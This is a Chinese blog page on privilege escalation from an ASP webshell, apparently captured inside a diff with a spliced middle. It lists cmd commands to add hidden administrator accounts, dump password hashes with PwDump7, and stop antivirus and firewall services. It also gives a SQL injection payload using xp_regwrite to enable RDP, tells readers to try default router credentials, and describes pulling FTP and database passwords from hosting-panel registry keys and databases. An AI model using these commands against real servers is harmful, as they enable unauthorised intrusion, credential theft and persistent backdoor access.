<p>4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。</p> <p>6.c:\windows\temp\cookies\  这个目录</p> <p>7.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！</p> <p>8.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入<code>net user jianmei daxia /add</code></p> <p>9.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。</p> <p>10.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。</p> <p>11.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</p> <p>12.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。</p> <p>13.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。</p> <p>14.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。</p> <p>15.当可读可写目录存在空格的时候，会出现这样的情况：’C:\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：<code>Cd C:\Documents and Settings\All Users\Application Data\Microsoft</code> 目录
 然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～</p> <p>16.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，<code>net user administrator</code>看下本地组成员，*administrators</p> <p>17.进入服务器，可以继续内网渗透  这个时候可以尝试打开路由器 默认帐号密码 admin  admin</p> <p>18.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：<code>”&quot;c:\xxx\exp.exe “whoami”</code>  记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。</p> <p>19.一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现，</p> <p>20.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c <code>c:\windows\temp\cookies\PwDump7.exe &gt;1.txt</code></p> <p>21.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后<code>setp c:\windows\temp\cmd.exe</code> 设置终端路径为：<code>c:\windows\temp\cmd.exe</code></p> <p>22.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。
 上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c</p> <p><code>“c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs</code></p> <p>23.如何辨别服务器是不是内网？ 192.168.x.x    172.16.x.x    10.x.x.x</p> <h2 id="dos命令大全"><a href="#dos命令大全" class="header-anchor">#</a> dos命令大全</h2> <p>查看版本：<code>ver</code></p> <p>查看权限：<code>whoami</code></p> <p>查看配置：<code>systeminfo</code></p> <p>查看用户：<code>net user</code></p> <p>查看进程：<code>tasklist</code></p> <p>查看正在运行的服务：<code>tasklist /svc</code></p> <p>查看开放的所有端口：<code>netstat -ano</code></p> <p>查询管理用户名：<code>query user</code></p> <p>查看搭建环境：<code>ftp 127.0.0.1</code></p> <p>查看指定服务的路径：<code>sc qc Mysql</code></p> <p>添加一个用户：<code>net user jianmei daxia.asd /add</code></p> <p>提升到管理权限：<code>net localgroup administrators jianmei /add</code></p> <p>添加用户并提升权限：<code>net user jianmei daxia.asd /add &amp; net localgroup administrators jianmei /add</code></p> <p>查看制定用户信息：<code>net user jianmei</code></p> <p>查看所有管理权限的用户：<code>net localgroup administrators</code></p> <p>加入远程桌面用户组：<code>net localgroup “Remote Desktop Users” jianmei /add</code></p> <p>突破最大连接数：<code>mstsc /admin /v:127.0.0.1</code></p> <p>删除用户：<code>net user jianmei /del</code></p> <p>删除管理员账户:<code>net user administrator daxia.asd</code></p> <p>更改系统登陆密码：<code>net password daxia.asd</code></p> <p>激活GUEST用户：<code>net user guest /active:yes</code></p> <p>开启TELNET服务：<code>net start telnet</code></p> <p>关闭麦咖啡：<code>net stop “McAfee McShield”</code></p> <p>关闭防火墙：<code>net stop sharedaccess</code></p> <p>查看当前目录的所有文件：<code>dir c:\windows\</code></p> <p>查看制定文件的内容：<code>type c:\windows\1.asp</code></p> <p>把cmd.exe复制到c:\windows的temp目录下并命名为cmd.txt：<code>copy c:\windows\temp\cookies\cmd.exe c:\windows\temp\cmd.txt</code></p> <p>开3389端口的命令：<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p> <p>查看补丁：<code>dir c:\windows\&gt;a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;del /f /q /a a.txt</code></p> <h2 id="sql语句直接开启3389"><a href="#sql语句直接开启3389" class="header-anchor">#</a> SQL语句直接开启3389</h2> <p>3389登陆关键注册表位置：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>TerminalServer<span class="token punctuation">\</span>DenyTSConnections
 </code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。</p> <p>而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。</p> <p>开启3389的SQL语句：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>syue.com/xiaohua.asp?id<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token builtin class-name">exec</span> master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,<span class="token string">'SYSTEM\CurrentControlSet\Control\Terminal Server’,'</span>fDenyTSConnections’,'REG_DWORD’,0<span class="token punctuation">;</span>–
@@ -429,15 +437,15 @@ Shift5 Backdoor created<span class="token operator">!</span>
 HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>software<span class="token punctuation">\</span>hzhost<span class="token punctuation">\</span>config<span class="token punctuation">\</span>settings<span class="token punctuation">\</span>mysqlpass     root密码
 HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>software<span class="token punctuation">\</span>hzhost<span class="token punctuation">\</span>config<span class="token punctuation">\</span>settings<span class="token punctuation">\</span>mssqlpss       sa 密码
 </code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>c:\windows\temp 下有hzhost主机留下的ftp登陆记录有用户名和密码</p> <p>以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用</p> <p>百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具</p> <p>(( N点虚拟主机 ))</p> <p>N点虚拟主机管理系统默认数据库地址为：\host_date#host # date#.mdb</p> <p>rl直接输入不行 这里咱们替换下 #=# 空格=</p> <p>修改后的下载地址为/host_date/#host # date#196.mdb</p> <p>N点数据库下载之后找到sitehost表 FTPuser&amp;FTPpass 值  FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码</p> <p>N点默认安装路径<code>C:\Program Files\NpointSoft\npointhost\web\</code></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>D:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>NpointSoft<span class="token punctuation">\</span>npointhost<span class="token punctuation">\</span>web<span class="token punctuation">\</span>
-</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库</p> <p>N点解密工具代码。</p> <h2 id="写在最后"><a href="#写在最后" class="header-anchor">#</a> 写在最后</h2> <blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote> <p><img alt="" data-src="https://img-blog.csdnimg.cn/20200906013715889.png" loading="lazy" class="lazy"></p></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/binghe001/BingheGuide/edit/master/docs/md/hack/raising/2022-05-02-003-ASP-Web提权.md" target="_blank" rel="noopener noreferrer">在 GitHub 上编辑此页</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="last-updated"><span class="prefix">上次更新: </span> <span class="time">2022/7/4</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
-          ←
-          <a href="/md/hack/raising/2022-05-02-002-NC反弹CMDSHELL提权总结.html" class="prev">
-            NC反弹CMDSHELL提权总结
-          </a></span> <span class="next"><a href="/md/hack/raising/2022-05-02-004-MSF提权.html">
-            MSF提权
-          </a>
-          →
-        </span></p></div> </main></div> <aside class="page-sidebar"> <div class="page-side-toolbar"><div class="option-box-toc-fixed"><div class="toc-container-sidebar"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="max-height:650px"><div style="font-weight:bold;text-align:center;">ASP Web提权</div> <hr> <div class="toc-box"><ul class="toc-sidebar-links"><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#web提权" class="toc-sidebar-link">web提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#dos命令大全" class="toc-sidebar-link">dos命令大全</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sql语句直接开启3389" class="toc-sidebar-link">SQL语句直接开启3389</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#常见杀软" class="toc-sidebar-link">常见杀软</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#windows提权中敏感目录和敏感注册表的利用" class="toc-sidebar-link">Windows提权中敏感目录和敏感注册表的利用</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#提权中的敏感注册表位置" class="toc-sidebar-link">提权中的敏感注册表位置</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#wscript-shell的删除和恢复" class="toc-sidebar-link">wscript.shell的删除和恢复</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何找到准确的终端连接端口" class="toc-sidebar-link">如何找到准确的终端连接端口？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#iis6提权提示can-not-find-wmiprvse-exe的突破方法" class="toc-sidebar-link">iis6提权提示Can not find wmiprvse.exe的突破方法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#本地溢出提权" class="toc-sidebar-link">本地溢出提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sa提权" class="toc-sidebar-link">sa提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#root提权" class="toc-sidebar-link">root提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何查看root密码" class="toc-sidebar-link">如何查看root密码？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#serv-u提权" class="toc-sidebar-link">serv-u提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#端口转发" class="toc-sidebar-link">端口转发</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#星外提权" class="toc-sidebar-link">星外提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#ee提权法" class="toc-sidebar-link">ee提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#vbs提权法" class="toc-sidebar-link">vbs提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#_360提权" class="toc-sidebar-link">360提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#搜狗提权" class="toc-sidebar-link">搜狗提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#华众虚拟主机提权" class="toc-sidebar-link">华众虚拟主机提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#写在最后" class="toc-sidebar-link">写在最后</a><ul class="toc-sidebar-sub-headers"></ul></li></ul></div></div></div></div></div> <div class="option-box-toc-over"><img src="/images/system/toc.png" class="nozoom"> <span class="show-txt">目录</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="max-height:550px"><div style="font-weight:bold;text-align:center;">ASP Web提权</div> <hr> <div class="toc-box"><ul class="toc-sidebar-links"><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#web提权" class="toc-sidebar-link">web提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#dos命令大全" class="toc-sidebar-link">dos命令大全</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sql语句直接开启3389" class="toc-sidebar-link">SQL语句直接开启3389</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#常见杀软" class="toc-sidebar-link">常见杀软</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#windows提权中敏感目录和敏感注册表的利用" class="toc-sidebar-link">Windows提权中敏感目录和敏感注册表的利用</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#提权中的敏感注册表位置" class="toc-sidebar-link">提权中的敏感注册表位置</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#wscript-shell的删除和恢复" class="toc-sidebar-link">wscript.shell的删除和恢复</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何找到准确的终端连接端口" class="toc-sidebar-link">如何找到准确的终端连接端口？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#iis6提权提示can-not-find-wmiprvse-exe的突破方法" class="toc-sidebar-link">iis6提权提示Can not find wmiprvse.exe的突破方法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#本地溢出提权" class="toc-sidebar-link">本地溢出提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sa提权" class="toc-sidebar-link">sa提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#root提权" class="toc-sidebar-link">root提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何查看root密码" class="toc-sidebar-link">如何查看root密码？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#serv-u提权" class="toc-sidebar-link">serv-u提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#端口转发" class="toc-sidebar-link">端口转发</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#星外提权" class="toc-sidebar-link">星外提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#ee提权法" class="toc-sidebar-link">ee提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#vbs提权法" class="toc-sidebar-link">vbs提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#_360提权" class="toc-sidebar-link">360提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#搜狗提权" class="toc-sidebar-link">搜狗提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#华众虚拟主机提权" class="toc-sidebar-link">华众虚拟主机提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#写在最后" class="toc-sidebar-link">写在最后</a><ul class="toc-sidebar-sub-headers"></ul></li></ul></div></div></div></div></div> <div class="option-box"><img src="/images/system/wechat.png" class="nozoom"> <span class="show-txt">手机看</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.9rem">微信扫一扫</span> <img height="180px" src="https://api.qrserver.com/v1/create-qr-code/?data=https://binghe001.github.io/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html" style="margin:10px;">
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库</p> <p>N点解密工具代码。</p> <h2 id="写在最后"><a href="#写在最后" class="header-anchor">#</a> 写在最后</h2> <blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote> <p><img alt="" data-src="https://img-blog.csdnimg.cn/20200906013715889.png" loading="lazy" class="lazy"></p></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/binghe001/BingheGuide/edit/master/docs/md/hack/raising/2022-05-02-003-ASP-Web提权.md" target="_blank" rel="noopener noreferrer">在 GitHub 上编辑此页</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <div class="last-updated"><span class="prefix">上次更新: </span> <span class="time">2022/7/11</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
+        ←
+        <a href="/md/hack/raising/2022-05-02-002-NC反弹CMDSHELL提权总结.html" class="prev">
+          NC反弹CMDSHELL提权总结
+        </a></span> <span class="next"><a href="/md/hack/raising/2022-05-02-004-MSF提权.html">
+          MSF提权
+        </a>
+        →
+      </span></p></div> </main></div> <aside class="page-sidebar"> <div class="page-side-toolbar"><div class="option-box-toc-fixed"><div class="toc-container-sidebar"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="max-height:650px"><div style="font-weight:bold;text-align:center;">ASP Web提权</div> <hr> <div class="toc-box"><ul class="toc-sidebar-links"><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#web提权" class="toc-sidebar-link">web提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#dos命令大全" class="toc-sidebar-link">dos命令大全</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sql语句直接开启3389" class="toc-sidebar-link">SQL语句直接开启3389</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#常见杀软" class="toc-sidebar-link">常见杀软</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#windows提权中敏感目录和敏感注册表的利用" class="toc-sidebar-link">Windows提权中敏感目录和敏感注册表的利用</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#提权中的敏感注册表位置" class="toc-sidebar-link">提权中的敏感注册表位置</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#wscript-shell的删除和恢复" class="toc-sidebar-link">wscript.shell的删除和恢复</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何找到准确的终端连接端口" class="toc-sidebar-link">如何找到准确的终端连接端口？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#iis6提权提示can-not-find-wmiprvse-exe的突破方法" class="toc-sidebar-link">iis6提权提示Can not find wmiprvse.exe的突破方法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#本地溢出提权" class="toc-sidebar-link">本地溢出提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sa提权" class="toc-sidebar-link">sa提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#root提权" class="toc-sidebar-link">root提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何查看root密码" class="toc-sidebar-link">如何查看root密码？</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#serv-u提权" class="toc-sidebar-link">serv-u提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#端口转发" class="toc-sidebar-link">端口转发</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#星外提权" class="toc-sidebar-link">星外提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#ee提权法" class="toc-sidebar-link">ee提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#vbs提权法" class="toc-sidebar-link">vbs提权法</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#_360提权" class="toc-sidebar-link">360提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#搜狗提权" class="toc-sidebar-link">搜狗提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#华众虚拟主机提权" class="toc-sidebar-link">华众虚拟主机提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#写在最后" class="toc-sidebar-link">写在最后</a><ul class="toc-sidebar-sub-headers"></ul></li></ul></div></div></div></div></div> <div class="option-box-toc-over"><img src="/images/system/toc.png" class="nozoom"> <span class="show-txt">目录</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="max-height:550px"><div style="font-weight:bold;text-align:center;">ASP Web提权</div> <hr> <div class="toc-box"><ul class="toc-sidebar-links"><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#web提权" class="toc-sidebar-link">web提权</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#dos命令大全" class="toc-sidebar-link">dos命令大全</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#sql语句直接开启3389" class="toc-sidebar-link">SQL语句直接开启3389</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#常见杀软" class="toc-sidebar-link">常见杀软</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#windows提权中敏感目录和敏感注册表的利用" class="toc-sidebar-link">Windows提权中敏感目录和敏感注册表的利用</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#提权中的敏感注册表位置" class="toc-sidebar-link">提权中的敏感注册表位置</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#wscript-shell的删除和恢复" class="toc-sidebar-link">wscript.shell的删除和恢复</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/raising/2022-05-02-003-ASP-Web%E6%8F%90%E6%9D%83.html#如何找到准确的终端连接端口" class="toc-sidebar-link">如何找到准确的终端连接端口？</a><ul 